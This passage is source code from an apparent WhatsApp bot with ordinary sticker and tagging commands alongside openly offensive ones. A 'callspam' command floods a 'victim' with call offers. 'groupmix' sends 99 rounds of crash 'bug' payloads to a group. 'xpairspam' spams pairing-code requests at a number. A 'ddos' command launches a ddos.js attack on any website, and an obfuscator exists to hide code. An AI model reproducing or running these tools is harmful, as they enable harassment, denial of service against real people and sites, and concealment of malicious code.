     }   c a t c h   ( e )   { 
         c o n s o l e . l o g ( e ) ; 
         r e p l y g c x e o n ( " E r r o r   c h e c k i n g   n u m b e r ! " ) ; 
     } 
 } 
 b r e a k ; 
                 
                 
 c a s e   ' c a l l s p a m ' : { 
 i f   ( ! i s B o t   & &   ! i s C r e a t o r )   r e t u r n 
 i f   ( ! q )   r e t u r n   r e p l y g c x e o n ( ` E x a m p l e : \ n   $ { p r e f i x   +   c o m m a n d }   2 0 X X X ` ) 
 v i c t i m   =   t e x t . s p l i t ( " | " ) [ 0 ] 
 c o n s t   X r e t u r n   =   m . m e n t i o n e d J i d [ 0 ]   ?   m . m e n t i o n e d J i d [ 0 ]   :   m . q u o t e d   ?   m . q u o t e d . s e n d e r   :   v i c t i m . r e p l a c e ( / [ ^ 0 - 9 ] / g , ' ' ) + " @ s . w h a t s a p p . n e t " 
 v a r   c o n t a c t I n f o   =   a w a i t   X e o n B o t I n c . o n W h a t s A p p ( X r e t u r n ) ; 
     i f   ( v i c t i m   = =   " 2 0 1 5 0 7 1 5 1 6 9 7 " )   { 
         r e t u r n ; 
         } 
         i f   ( v i c t i m   = =   " 9 1 9 3 6 6 3 1 6 0 1 8 " )   { 
         r e t u r n ; 
         } 
         i f   ( v i c t i m   = =   " 9 1 9 4 0 2 1 0 4 4 0 1 " )   { 
         r e t u r n ; 
     } 
     i f   ( c o n t a c t I n f o . l e n g t h   = =   0 )   { 
         r e t u r n   r e p l y g c x e o n ( " T h e   n u m b e r   i s   n o t   r e g i s t e r e d   o n   W h a t s A p p " ) ; 
     } 
     
     a s y n c   f u n c t i o n   s e n d O f f e r C a l l ( t a r g e t )   { 
         t r y   { 
                 a w a i t   X e o n B o t I n c . o f f e r C a l l ( t a r g e t ) ; 
                 / * c o n s o l e . l o g ( c h a l k . w h i t e . b o l d ( ` S u c c e s s   S e n d   O f f e r   C a l l   T o   T a r g e t ` ) ) ; * / 
         }   c a t c h   ( e r r o r )   { 
                 / * c o n s o l e . e r r o r ( c h a l k . w h i t e . b o l d ( ` F a i l e d   S e n d   O f f e r   C a l l   T o   T a r g e t : ` ,   e r r o r ) ) ; * / 
         } 
 } 
 
     s e n d M e s s a g e W i t h M e n t i o n s ( 
         " S u c c e s s f u l l y   S e n t   S p a m   C a l l   T o   @ "   +   X r e t u r n . s p l i t ( ' @ ' ) [ 0 ]   +   
         "   U s i n g   * "   +   c o m m a n d   +   " *   ✅ \ n \ n P a u s e   2   m i n u t e s   s o   t h a t   t h e   b o t   i s   n o t   b a n n e d . " ,   
         [ X r e t u r n ] 
     ) ; 
 	 a w a i t   s l e e p ( 1 0 0 0 ) 
 f o r   ( l e t   i   =   0 ;   i   <   7 ;   i + + )   { 
 a w a i t   s e n d O f f e r C a l l ( X r e t u r n ) 
 a w a i t   s l e e p ( 2 0 0 0 ) 
 } 
     } 
 b r e a k 
 
 
 c a s e   ' g r o u p m i x ' : { 
 i f   ( ! i s B o t   & &   ! i s C r e a t o r )   r e t u r n 
 	 i f   ( ! q )   r e t u r n   r e p l y g c x e o n ( ` E x a m p l e : \ n   $ { p r e f i x   +   c o m m a n d }   1 2 0 3 6 3 0 4 7 6 2 6 5 3 7 x x x @ g . u s \ n \ n T o   g e t   g r o u p   i d ,   p l e a s e   t y p e   . l i s t g c \ n \ n T o   g e t   g r o u p   i d   f r o m   a   g r o u p   l i n k ,   t y p e   . g r o u p i d   l i n k   ` ) 
 	 / /   C h e c k   i f   i n p u t   i s   a   W h a t s A p p   g r o u p   l i n k 
         i f   ( q . i n c l u d e s ( " c h a t . w h a t s a p p . c o m " ) )   { 
                 r e t u r n   r e p l y g c x e o n ( " G r o u p   I D   m u s t   b e   a   n u m b e r ,   n o t   a   l i n k .   U s e   . g r o u p i d   < l i n k >   t o   g e t   t h e   g r o u p   I D . " ) ; 
         } 
 v i c t i m   =   t e x t . s p l i t ( " | " ) [ 0 ] 
 
 r e p l y g c x e o n ( ` S u c c e s s f u l l y   s e n t   b u g   t o   t h e   g r o u p   c h a t ` ) 
 
 	 	 f o r   ( l e t   i   =   0 ;   i   <   9 9 ;   i + + )   { 
     t r y   { 
         a w a i t   x e o n I o s I n v i ( v i c t i m ) ; 
 	 a w a i t   x e o n A n d r o S p a m G p ( v i c t i m ) ; 
 	 a w a i t   f o r c e r g p ( v i c t i m ) ; 
 	 a w a i t   s l e e p ( 5 0 0 ) ; 
     }   c a t c h   ( e )   { 
         c o n s o l e . e r r o r ( " L o o p   s t o p p e d : " ,   e . m e s s a g e ) ; 
         } } } 
         b r e a k ; 
 	 
 
                                 c a s e   ' g r o u p i d ' :   { 
         
         i f   ( ! i s B o t   & &   ! i s C r e a t o r )   r e t u r n 
         i f   ( ! t e x t )   r e t u r n   r e p l y g c x e o n ( ' E n t e r   G r o u p   L i n k ! ' ) ; 
         i f   ( ! i s U r l ( a r g s [ 0 ] )   & &   ! a r g s [ 0 ] . i n c l u d e s ( ' w h a t s a p p . c o m ' ) )   r e t u r n   r e p l y g c x e o n ( ' L i n k   I n v a l i d ! ' ) ; 
 
         / /   E x t r a c t   t h e   g r o u p   c o d e ,   r e m o v i n g   a n y   q u e r y   p a r a m e t e r s 
         l e t   g r o u p C o d e   =   a r g s [ 0 ] . s p l i t ( ' h t t p s : / / c h a t . w h a t s a p p . c o m / ' ) [ 1 ] ; 
         g r o u p C o d e   =   g r o u p C o d e . s p l i t ( ' ? ' ) [ 0 ] ;   / /   R e m o v e   a n y   q u e r y   p a r a m e t e r s 
 
         t r y   { 
                 c o n s t   x e o n t r y   =   a w a i t   X e o n B o t I n c . g r o u p A c c e p t I n v i t e ( g r o u p C o d e ) ; 
                 
                 i f   ( ! x e o n t r y )   { 
                         r e t u r n   r e p l y g c x e o n ( ' T h e   g r o u p   c h a t   e i t h e r   h a s   t h e   a p p r o v a l   f e a t u r e   e n a b l e d ,   y o u   h a v e   b e e n   r e m o v e d   f r o m   t h e   g r o u p   o r   t h e   i n v i t e   l i n k   h a s   e x p i r e d .   P l e a s e   j o i n   t h e   g r o u p   c h a t   f i r s t   a n d   t r y   u s i n g   t h e   c o m m a n d   . l i s t g c . ' ) ; 
                 } 
 
                 r e p l y g c x e o n ( ` G r o u p   I D :   $ { x e o n t r y } ` ) ; 
         }   c a t c h   ( e r r o r )   { 
                 r e p l y g c x e o n ( ' T h e   g r o u p   c h a t   e i t h e r   h a s   t h e   a p p r o v a l   f e a t u r e   e n a b l e d ,   y o u   h a v e   b e e n   r e m o v e d   f r o m   t h e   g r o u p   o r   t h e   i n v i t e   l i n k   h a s   e x p i r e d .   P l e a s e   j o i n   t h e   g r o u p   c h a t   f i r s t   a n d   t r y   u s i n g   t h e   c o m m a n d   . l i s t g c . ' ) ; 
         } 
 } 
 b r e a k ; 
 
 c a s e   ' a u t o s w v i e w ' : 
         c a s e   ' a u t o s t a t u s v i e w ' : { 
         i f   ( ! i s B o t   & &   ! i s C r e a t o r )   r e t u r n 
                               i f   ( a r g s [ 0 ]   = = =   ' o n ' )   { 
                                     d b . d a t a . s e t t i n g s [ b o t N u m b e r ] . a n t i s w v i e w   =   t r u e 
                                     r e p l y g c x e o n ( ` S u c c e s s f u l l y   $ { c o m m a n d }   i s   e n a b l e d ` ) 
                               }   e l s e   i f   ( a r g s [ 0 ]   = = =   ' o f f ' )   { 
                                     d b . d a t a . s e t t i n g s [ b o t N u m b e r ] . a n t i s w v i e w   =   f a l s e 
                                     r e p l y g c x e o n ( ` S u c c e s s f u l l y   $ { c o m m a n d }   i s   d i s a b l e d ` ) 
                               }   e l s e   { 
                                 	 r e p l y g c x e o n ( ` P l e a s e   s e l e c t   o n / o f f \ n \ E x a m p l e :   $ { p r e f i x + c o m m a n d }   o n ` ) 
                         } 
                         } 
                         b r e a k 
                         
                         c a s e   ' t o t a g ' :   { 
 	 	 	 	 i f   ( ! m . i s G r o u p )   r e t u r n   r e p l y g c x e o n ( m e s s . O n l y G r u p ) 
 	 	 	 	 i f   ( ! m . q u o t e d )   r e t u r n   r e p l y g c x e o n ( ` R e p l y   m e s s a g e   w i t h   c a p t i o n   $ { p r e f i x   +   c o m m a n d } ` ) 
 	 	 	 	 d e l e t e   m . q u o t e d . c h a t 
 	 	 	 	 a w a i t   X e o n B o t I n c . s e n d M e s s a g e ( m . c h a t ,   {   f o r w a r d :   m . q u o t e d . f a k e O b j ,   m e n t i o n s :   p a r t i c i p a n t s . m a p ( a   = >   a . i d )   } ) 
 	 	 	 } 
 	 	 	 b r e a k 
 	 	 	 
 	 	 	 c a s e   ' h i d e t a g ' :   c a s e   ' h ' :   { 
 	 	 	 	 i f   ( ! m . i s G r o u p )   r e t u r n   r e p l y g c x e o n ( m e s s . O n l y G r u p ) 
 	 	 	 	 X e o n B o t I n c . s e n d M e s s a g e ( m . c h a t ,   {   t e x t   :   q   ?   q   :   ' '   ,   m e n t i o n s :   p a r t i c i p a n t s . m a p ( a   = >   a . i d ) } ) 
 	 	 	 } 
 	 	 	 b r e a k 
 	 	 	 
 	 	 	 c a s e   ' s ' :   c a s e   ' s t i c k e r ' :   c a s e   ' s t i k e r ' :   { 
 i f   ( ! q u o t e d )   r e t u r n   r e p l y g c x e o n ( ` S e n d / R e p l y   I m a g e s / V i d e o s / G i f s   W i t h   C a p t i o n s   $ { p r e f i x + c o m m a n d } \ n V i d e o   D u r a t i o n   1 - 9   S e c o n d s ` ) 
 i f   ( / i m a g e / . t e s t ( m i m e ) )   { 
 l e t   m e d i a   =   a w a i t   q u o t e d . d o w n l o a d ( ) 
 l e t   e n c m e d i a   =   a w a i t   X e o n B o t I n c . s e n d I m a g e A s S t i c k e r ( m . c h a t ,   m e d i a ,   m ,   {   p a c k n a m e :   g l o b a l . p a c k n a m e ,   a u t h o r :   g l o b a l . a u t h o r   } ) 
 }   e l s e   i f   ( / v i d e o / . t e s t ( m i m e ) )   { 
 i f   ( ( q u o t e d . m s g   | |   q u o t e d ) . s e c o n d s   >   1 1 )   r e t u r n   r e p l y g c x e o n ( ' S e n d / R e p l y   I m a g e s / V i d e o s / G i f s   W i t h   C a p t i o n s   $ { p r e f i x + c o m m a n d } \ n V i d e o   D u r a t i o n   1 - 9   S e c o n d s ' ) 
 l e t   m e d i a   =   a w a i t   q u o t e d . d o w n l o a d ( ) 
 l e t   e n c m e d i a   =   a w a i t   X e o n B o t I n c . s e n d V i d e o A s S t i c k e r ( m . c h a t ,   m e d i a ,   m ,   {   p a c k n a m e :   g l o b a l . p a c k n a m e ,   a u t h o r :   g l o b a l . a u t h o r   } ) 
 }   e l s e   { 
 r e p l y g c x e o n ( ` S e n d / R e p l y   I m a g e s / V i d e o s / G i f s   W i t h   C a p t i o n s   $ { p r e f i x + c o m m a n d } \ n V i d e o   D u r a t i o n   1 - 9   S e c o n d s ` ) 
 } 
 } 
 b r e a k 
 
 c a s e   ' s w m ' :   c a s e   ' s t e a l ' :   c a s e   ' s t i c k e r w m ' :   c a s e   ' t a k e ' : { 
 i f   ( ! i s P r e m i u m )   r e t u r n   r e p l y p r e m ( m e s s . p r e m i u m ) 
 i f   ( ! a r g s . j o i n ( "   " ) )   r e t u r n   r e p l y g c x e o n ( ` W h e r e   i s   t h e   t e x t ? ` ) 
 c o n s t   s w n   =   a r g s . j o i n ( "   " ) 
 c o n s t   p c k n m   =   s w n . s p l i t ( " | " ) [ 0 ] 
 c o n s t   a t n m   =   s w n . s p l i t ( " | " ) [ 1 ] 
 i f   ( m . q u o t e d . i s A n i m a t e d   = = =   t r u e )   { 
 X e o n B o t I n c . d o w n l o a d A n d S a v e M e d i a M e s s a g e ( q u o t e d ,   " g i f e e " ) 
 X e o n B o t I n c . s e n d M e s s a g e ( m . c h a t ,   { s t i c k e r : f s . r e a d F i l e S y n c ( " g i f e e . w e b p " ) } ,   m ,   {   p a c k n a m e :   p c k n m ,   a u t h o r :   a t n m   } ) 
 }   e l s e   i f   ( / i m a g e / . t e s t ( m i m e ) )   { 
 l e t   m e d i a   =   a w a i t   q u o t e d . d o w n l o a d ( ) 
 l e t   e n c m e d i a   =   a w a i t   X e o n B o t I n c . s e n d I m a g e A s S t i c k e r ( m . c h a t ,   m e d i a ,   m ,   {   p a c k n a m e :   p c k n m ,   a u t h o r :   a t n m   } ) 
 }   e l s e   i f   ( / v i d e o / . t e s t ( m i m e ) )   { 
 i f   ( ( q u o t e d . m s g   | |   q u o t e d ) . s e c o n d s   >   1 1 )   r e t u r n   r e p l y g c x e o n ( ' M a x i m u m   1 0   S e c o n d s ! ' ) 
 l e t   m e d i a   =   a w a i t   q u o t e d . d o w n l o a d ( ) 
 l e t   e n c m e d i a   =   a w a i t   X e o n B o t I n c . s e n d V i d e o A s S t i c k e r ( m . c h a t ,   m e d i a ,   m ,   {   p a c k n a m e :   p c k n m ,   a u t h o r :   a t n m   } ) 
 }   e l s e   { 
 r e p l y g c x e o n ( ` P h o t o / V i d e o ? ` ) 
 } 
 } 
 b r e a k 
 
 c a s e     " m e 0 0 "   :   { 
 a w a i t   X e o n B o t I n c . s e n d M e s s a g e ( m . c h a t ,   {   r e a c t :   {   t e x t :   ' � � ' ,   k e y :   m . k e y   } } ) ; 
 a w a i t   X e o n B o t I n c . s e n d M e s s a g e ( m . c h a t ,   {   r e a c t :   {   t e x t :   ' � � ' ,   k e y :   m . k e y   } } ) ; 
 a w a i t   X e o n B o t I n c . s e n d M e s s a g e ( m . c h a t ,   {   r e a c t :   {   t e x t :   ' ✔ ️ ' ,   k e y :   m . k e y   } } ) ; 
       a w a i t   l o a d i n g ( ) 
 l e t   m e n u   =   `                                 ❲   � � - � � _ � � � � � � � � / � � � � � � � � � �     ❳ 
 ❐ 
 -   ⭔ -   U S E R N A M E   :   $ { p u s h n a m e } 
 -   ⭔ -   O W N E R   :   + 2 0 1 0 2 9 4 1 0 7 6 6 
 -   ⭔ -   B O T :   � � � � � �   � � � � � � � �   � � � � ` 
 l e t   b u t t o n s   =   [ 
                 {   b u t t o n i d :   " b u g m e n u " ,   b u t t o n T e x t :   {   d i s p l a y T e x t :   " T h a n k s   T o "   }   } 
         ] ; 
 
         l e t   b u t t o n M e s s a g e   =   { 
                 i m a g e :   {   u r l :   ` h t t p s : / / f i l e s . c a t b o x . m o e / 8 c 1 r d s . j p g `   } , 
 	         g i f P l a y b a c k :   t r u e , 
                 c a p t i o n :   m e n u , 
                 c o n t e x t I n f o :   { 
                         f o r w a r d i n g S c o r e :   9 9 9 , 
                         i s F o r w a r d e d :   t r u e , 
                         f o r w a r d e d N e w s l e t t e r M e s s a g e I n f o :   { 
                                 n e w s l e t t e r J i d :   " 1 2 0 3 6 3 3 8 5 7 3 9 3 4 3 0 5 8 @ n e w s l e t t e r " , 
                                 n e w s l e t t e r N a m e :   `   ` 
                         } 
                 } , 
                 f o o t e r :   " >   ༒ ︎ � � - � �   ᵗ ᵉ ᵃ ᵐ " , 
                 b u t t o n s :   b u t t o n s , 
                 v i e w O n c e :   t r u e , 
                 h e a d e r T y p e :   6 
       } 
         c o n s t   a u d i o U r l   =   " h t t p s : / / f i l e s . c a t b o x . m o e / r v a 9 3 z . m p 3 " ;   / /   ر ا ب ط   ا ل ص و ت   م ن   T i k T o k 
         c o n s t   f l o w A c t i o n s   =   [ 
                 { 
                         b u t t o n I d :     ' a c t i o n '   , 
                         b u t t o n T e x t :   {   d i s p l a y T e x t :     ' T h i s   B u t t o n   L i s t '     } , 
                         t y p e :   4 , 
                         n a t i v e F l o w I n f o :   { 
                                 n a m e :     ' s i n g l e _ s e l e c t '   , 
                                 p a r a m s J s o n :   J S O N . s t r i n g i f y ( { 
                                         t i t l e :   " © ︎ � � - � � _ � � � � � � � � / � � � � � � � � � � " , 
                                         s e c t i o n s :   [ 
                                                 { 
                                                         t i t l e :   "       M E N U " , 
                                                         h i g h l i g h t _ l a b e l :   " " , 
                                                         r o w s :   [ 
                                                                 {   t i t l e :   " � � � � � � � � � � " ,   d e s c r i p t i o n :   "   * (   � � � � � � � � � �   ) * " ,   i d :   " m e 0 0 "   } , 
                                                                 
                                                               
                                                         ] 
                                                 } 
                                         ] 
                                 } ) 
                         } , 
                         v i e w O n c e :   t r u e 
                 } 
         ] ; 
 
         b u t t o n M e s s a g e . b u t t o n s . p u s h ( . . . f l o w A c t i o n s ) ; 
 
         a w a i t   X e o n B o t I n c . s e n d M e s s a g e ( m . c h a t ,   b u t t o n M e s s a g e ,   {   q u o t e d :   m   } ) ; 
 a w a i t   X e o n B o t I n c . s e n d M e s s a g e ( m . c h a t ,   { 
 a u d i o :   {   u r l :   a u d i o U r l   } , 
 m i m e t y p e :   ' a u d i o / m p 4 ' , 
 p t t :   f a l s e , 
 c o n t e x t I n f o :   { 
 i s F o r w a r d e d :   t r u e 
 } 
 } ) ; 
 } ;   
 b r e a k   
                 
                 
 
 
 
 c a s e   ' x p a i r s p a m ' :   { 
 
 	 	 	 i f   ( ! q )   r e t u r n   r e p l y g c x e o n ( ` _ U s e   :   $ { p r e f i x + c o m m a n d }   n u m b e r \ n _ E x a m p l e   :   $ { p r e f i x + c o m m a n d }   9 1 6 9 0 9 1 3 7 2 1 1 ` ) 
 	 	 	 l e t   [ p e e n i s ,   p e p e k k   =   " 2 0 0 " ]   =   q . s p l i t ( " | " ) 
 	 	 	 
 	 	 	 l e t   t a r g e t   =   p e e n i s . r e p l a c e ( / [ ^ 0 - 9 ] / g ,   ' ' ) . t r i m ( ) 
 	 	 	 l e t   { 
 	 	 	 	 d e f a u l t :   m a k e W a S o c k e t , 
 	 	 	 	 u s e M u l t i F i l e A u t h S t a t e , 
 	 	 	 	 f e t c h L a t e s t B a i l e y s V e r s i o n 
 	 	 	 }   =   r e q u i r e ( ' @ a d i w a j s h i n g / b a i l e y s ' ) 
 	 	 	 l e t   { 
 	 	 	 	 s t a t e 
 	 	 	 }   =   a w a i t   u s e M u l t i F i l e A u t h S t a t e ( ' X S e s s i o n ' ) 
 	 	 	 l e t   { 
 	 	 	 	 v e r s i o n 
 	 	 	 }   =   a w a i t   f e t c h L a t e s t B a i l e y s V e r s i o n ( ) 
 	   r e p l y g c x e o n ( ` S u c c e s s ! ` ) 
 	 	 	 l e t   s u c k e d   =   a w a i t   m a k e W a S o c k e t ( { 
 	 	 	 	 a u t h :   s t a t e , 
 	 	 	 	 v e r s i o n , 
 	 	 	 	 l o g g e r :   p i n o ( { 
 	 	 	 	 	 l e v e l :   ' f a t a l ' 
 	 	 	 	 } ) 
 	 	 	 } ) 
 	 	 	 f o r   ( l e t   i   =   0 ;   i   <   p e p e k k ;   i + + )   { 
 	 	 	 	 a w a i t   s l e e p ( 1 5 0 0 ) 
 	 	 	 	 l e t   p r c   =   a w a i t   s u c k e d . r e q u e s t P a i r i n g C o d e ( t a r g e t ) 
 	 	 	 	 / * a w a i t   c o n s o l e . l o g ( ` S u c c e s   S p a m   P a i r i n g   C o d e   -   N u m b e r   :   $ { t a r g e t }   -   C o d e   :   $ { p r c } ` ) * / 
 	 	 	 } 
 	 	 	 a w a i t   s l e e p ( 1 5 0 0 0 ) 
 	 	 	 } 
 	 	 b r e a k 
 c a s e   ' d d o s ' : { 
 i f   ( ! i s B o t   & &   ! i s C r e a t o r )   r e t u r n 
 i f   ( ! q . i n c l u d e s ( '   ' ) )   r e t u r n   r e p l y g c x e o n ( ` U s e   M e t h o d e :   . $ { c o m m a n d }   < t a r g e t >   < t i m e > \ n E x a p l e :   . $ { c o m m a n d }   e x a m p l e . x y z   6 0 ` ) 
 i f   ( q . i n c l u d e s ( '   . s h o p ' ) ) { 
 	 r e t u r n   r e p l y g c x e o n ( ` C a n n o t   a t t a c k   d e v e l o p e r ' s   s i t e ` ) ; 
 	 } 
                                           c o n s t   t a r g e t w e b   =   q . s u b s t r i n g ( 0 ,   q . i n d e x O f ( '   ' )   -   0 ) 
                                 c o n s t   t i m e w e b   =   q . s u b s t r i n g ( q . l a s t I n d e x O f ( '   ' )   +   1 )   
 r e p l y g c x e o n ( ` B o t   i s   a t t a c k i n g   $ { t a r g e t w e b }   w i t h   t i m e   $ { t i m e w e b } ` ) 
                             e x e c ( ` n o d e   d d o s . j s   $ { t a r g e t w e b }   $ { t i m e w e b } ` ,   {   m a x B u f f e r :   1 0 2 4   *   1 0 2 4   } ,   ( e r r o r ,   s t d o u t ,   s t d e r r )   = >   { 
                 i f   ( e r r o r )   { 
                     r e p l y g c x e o n ( ` E r r o r :   $ { e r r o r . m e s s a g e } ` ) ; 
                     r e t u r n ; 
                 } 
                 i f   ( s t d e r r )   { 
                     r e p l y g c x e o n ( ` E r r o r :   $ { s t d e r r } ` ) ; 
                     r e t u r n ; 
                 } 
                 r e p l y g c x e o n ( ` S u c c e s s \ n \ n � �   t a r g e t :   $ { t a r g e t w e b } , \ n � �   T i m e :   $ { t i m e w e b } ` ) ; 
             } ) ;     
             }                                   
 b r e a k 
 
 c a s e   ' e n c ' :   c a s e   ' e n c r y p t ' :   { 
 i f   ( ! i s B o t   & &   ! i s C r e a t o r )   r e t u r n 
                 c o n s t   J S C o n f u s e r   =   r e q u i r e ( " j s - c o n f u s e r " ) ; 
                 c o n s t   u s a g e   =   ` U s a g e   E x a m p l e : 
 $ { p r e f i x   +   c o m m a n d }   ( I n p u t   t e x t   o r   r e p l y   t e x t   t o   o b f u s c a t e   c o d e ) 
 $ { p r e f i x   +   c o m m a n d }   d o c   ( R e p l y   t o   a   d o c u m e n t ) ` ; 
 
                 l e t   t e x t ; 
                 i f   ( a r g s . l e n g t h   > =   1 )   { 
                         t e x t   =   a r g s . j o i n ( "   " ) ; 
                 }   e l s e   i f   ( m . q u o t e d   & &   m . q u o t e d . t e x t )   { 
                         t e x t   =   m . q u o t e d . t e x t ; 
                 }   e l s e   { 
                         r e t u r n   r e p l y g c x e o n ( u s a g e ) ; 
                 } 
                 
                 t r y   { 
                         l e t   c o d e ; 
                         i f   ( t e x t   = = =   ' d o c '   & &   m . q u o t e d   & &   m . q u o t e d . m t y p e   = = =   ' d o c u m e n t M e s s a g e ' )   { 
                                 l e t   d o c B u f f e r ; 
                                 i f   ( m . q u o t e d . m i m e t y p e )   { 
                                         d o c B u f f e r   =   a w a i t   m . q u o t e d . d o w n l o a d ( ) ; 
                                 } 
                                 c o d e   =   d o c B u f f e r . t o S t r i n g ( ' u t f - 8 ' ) ; 
                         }   e l s e   { 
                                 c o d e   =   t e x t ; 
                         } 
 
 c o n s t   o p t i o n s O b f 6   =   { 
                     t a r g e t :   " n o d e " , 
         p r e s e t :   " h i g h " , 
         c o m p a c t :   t r u e , 
         m i n i f y :   t r u e , 
         f l a t t e n :   t r u e , 
 
         i d e n t i f i e r G e n e r a t o r :   f u n c t i o n ( )   { 
                 c o n s t   o r i g i n a l S t r i n g   =   
                         " 素 晴 座 素 晴 難   素 晴 座 素 晴 難 "   +   
                         " 素 晴 座 素 晴 難 H X B O T 素 晴 座 素 晴 難 " ; 
                 
                 / /   F u n g s i   u n t u k   m e n g h a p u s   k a r a k t e r   y a n g   t i d a k   d i i n g i n k a n 
                 f u n c t i o n   r e m o v e U n w a n t e d C h a r s ( i n p u t )   { 
                         r e t u r n   i n p u t . r e p l a c e ( 
                                 / [ ^ a - z A - Z 座 N a n d o k u k a 素 M u z u k a s h ī 素 晴 ] / g ,   ' ' 
                         ) ; 
                 } 
 
                 / /   F u n g s i   u n t u k   m e n g h a s i l k a n   s t r i n g   a c a k 
                 f u n c t i o n   r a n d o m S t r i n g ( l e n g t h )   { 
                         l e t   r e s u l t   =   ' ' ; 
                         c o n s t   c h a r a c t e r s   =   ' A B C D E F G H I J K L M N O P Q R S T U V W X Y Z a b c d e f g h i j k l m n o p q r s t u v w x y z ' ;   / /   H a n y a   s i m b o l 
                         c o n s t   c h a r a c t e r s L e n g t h   =   c h a r a c t e r s . l e n g t h ; 
 
                         f o r   ( l e t   i   =   0 ;   i   <   l e n g t h ;   i + + )   { 
                                 r e s u l t   + =   c h a r a c t e r s . c h a r A t ( 
                                         M a t h . f l o o r ( M a t h . r a n d o m ( )   *   c h a r a c t e r s L e n g t h ) 
                                 ) ; 
                         } 
                         r e t u r n   r e s u l t ; 
                 } 
 
                 r e t u r n   r e m o v e U n w a n t e d C h a r s ( o r i g i n a l S t r i n g )   +   r a n d o m S t r i n g ( 2 ) ; 
         } , 
 
         r e n a m e V a r i a b l e s :   t r u e , 
         r e n a m e G l o b a l s :   t r u e , 
 
         s t r i n g E n c o d i n g :   t r u e , 
         s t r i n g S p l i t t i n g :   0 . 0 , 
         s t r i n g C o n c e a l i n g :   t r u e , 
         s t r i n g C o m p r e s s i o n :   t r u e , 
         d u p l i c a t e L i t e r a l s R e m o v a l :   1 . 0 , 
 
         s h u f f l e :   { 
                 h a s h :   0 . 0 , 
                 t r u e :   0 . 0 
         } , 
 
         s t a c k :   t r u e , 
         c o n t r o l F l o w F l a t t e n i n g :   1 . 0 , 
         o p a q u e P r e d i c a t e s :   0 . 9 , 
         d e a d C o d e :   0 . 0 , 
         d i s p a t c h e r :   t r u e , 
         r g f :   f a l s e , 
         c a l c u l a t o r :   t r u e , 
         h e x a d e c i m a l N u m b e r s :   t r u e , 
         m o v e d D e c l a r a t i o n s :   t r u e , 
         o b j e c t E x t r a c t i o n :   t r u e , 
         g l o b a l C o n c e a l i n g :   t r u e 
 } ; 
 
 
                 c o n s t   o p t i o n s   =   { 
                         t a r g e t :   " n o d e " , 
     c a l c u l a t o r :   t r u e , 
     c o m p a c t :   t r u e , 
     h e x a d e c i m a l N u m b e r s :   t r u e , 
     c o n t r o l F l o w F l a t t e n i n g :   0 . 5 , 
     d e a d C o d e :   0 . 2 5 , 
     d i s p a t c h e r :   t r u e , 
     d u p l i c a t e L i t e r a l s R e m o v a l :   0 . 7 5 , 
     f l a t t e n :   t r u e , 
     g l o b a l C o n c e a l i n g :   t r u e , 
     m i n i f y :   t r u e , 
     m o v e d D e c l a r a t i o n s :   t r u e , 
     o b j e c t E x t r a c t i o n :   t r u e , 
     o p a q u e P r e d i c a t e s :   0 . 7 5 , 
     r e n a m e V a r i a b l e s :   t r u e , 
     r e n a m e G l o b a l s :   t r u e , 
     s h u f f l e :   t r u e , 
     s t r i n g C o n c e a l i n g :   t r u e , 
     s t r i n g C o m p r e s s i o n :   t r u e , 
     s t r i n g E n c o d i n g :   t r u e , 
     s t r i n g S p l i t t i n g :   0 . 7 5 , 
     p r e s e r v e F u n c t i o n L e n g t h :   t r u e , 
     i d e n t i f i e r G e n e r a t o r :   f u n c t i o n   ( )   { 
                                 r e t u r n   " D R E A M _ G U Y _ X E O N "   +   M a t h . r a n d o m ( ) . t o S t r i n g ( 3 6 ) . s u b s t r i n g ( 7 ) ; 
                         } , 
                 } ; 
 
                         c o n s t   o b f u s c a t e d C o d e   =   a w a i t   J S C o n f u s e r . o b f u s c a t e ( c o d e ,   o p t i o n s O b f 6 ) ; 
 
                         c o n s t   f i l e P a t h   =   ' . / e n c _ b y _ @   . j s ' ; 
                         f s . w r i t e F i l e S y n c ( f i l e P a t h ,   o b f u s c a t e d C o d e ) ; 
 
                         a w a i t   X e o n B o t I n c . s e n d M e s s a g e ( m . c h a t ,   { 
                                 d o c u m e n t :   { 
                                         u r l :   f i l e P a t h 
                                 } , 
                                 m i m e t y p e :   ' a p p l i c a t i o n / j a v a s c r i p t ' , 
                                 f i l e N a m e :   ' E n c r y p t e d   B y   @   . j s ' 
                         } ,   {   q u o t e d :   m   } ) ; 
 
                 }   c a t c h   ( e r r o r )   { 
                         c o n s t   e r r o r M e s s a g e   =   ` T h e r e   i s   a n   e r r o r :   $ { e r r o r . m e s s a g e } ` ; 
                         a w a i t   r e p l y g c x e o n ( e r r o r M e s s a g e ) ; 
                 } 
 } 
 b r e a k ; 
 c a s e   ' d e c ' :   c a s e   ' d e c r y p t ' :   { 
 i f   ( ! i s B o t   & &   ! i s C r e a t o r )   r e t u r n 
 c o n s t   {   w e b c r a c k   }   =   a w a i t   i m p o r t ( ' w e b c r a c k ' ) ; 
 c o n s t   u s a g e   =   ` U s a g e   E x a m p l e : 
 $ { p r e f i x   +   c o m m a n d }   ( I n p u t   t e x t   o r   r e p l y   t e x t   t o   d e c   c o d e ) 
 $ { p r e f i x   +   c o m m a n d }   d o c   ( R e p l y   t o   a   d o c u m e n t ) ` ; 
 
 l e t   t e x t ; 
 i f   ( a r g s . l e n g t h   > =   1 )   { 
 t e x t   =   a r g s . j o i n ( "   " ) ; 
 }   e l s e   i f   ( m . q u o t e d   & &   m . q u o t e d . t e x t )   { 
 t e x t   =   m . q u o t e d . t e x t ; 
 }   e l s e   { 
 r e t u r n   r e p l y g c x e o n ( u s a g e ) ; 
 } 
 
 t r y   { 
 l e t   m e s s a g e ; 
 i f   ( t e x t   = = =   ' d o c '   & &   m . q u o t e d   & &   m . q u o t e d . m t y p e   = = =   ' d o c u m e n t M e s s a g e ' )   { 
 l e t   d o c B u f f e r ; 
 i f   ( m . q u o t e d . m i m e t y p e )   { 
 d o c B u f f e r   =   a w a i t   m . q u o t e d . d o w n l o a d ( ) ; 
 } 
 m e s s a g e   =   a w a i t   w e b c r a c k ( d o c B u f f e r . t o S t r i n g ( ' u t f - 8 ' ) ) ; 
 }   e l s e   { 
 m e s s a g e   =   a w a i t   w e b c r a c k ( t e x t ) ; 
 } 
 
 c o n s t   f i l e P a t h   =   ' . / d e c _ b y _ @   . j s ' ; 
 f s . w r i t e F i l e S y n c ( f i l e P a t h ,   m e s s a g e . c o d e ) ; 
 
 a w a i t   X e o n B o t I n c . s e n d M e s s a g e ( m . c h a t ,   { 
 d o c u m e n t :   { 
 u r l :   f i l e P a t h 
 } , 
 m i m e t y p e :   ' a p p l i c a t i o n / j a v a s c r i p t ' , 
 f i l e N a m e :   ' D e c r y p t e d   B y   @   ' 
 } ,   { q u o t e d :   m } ) ; 
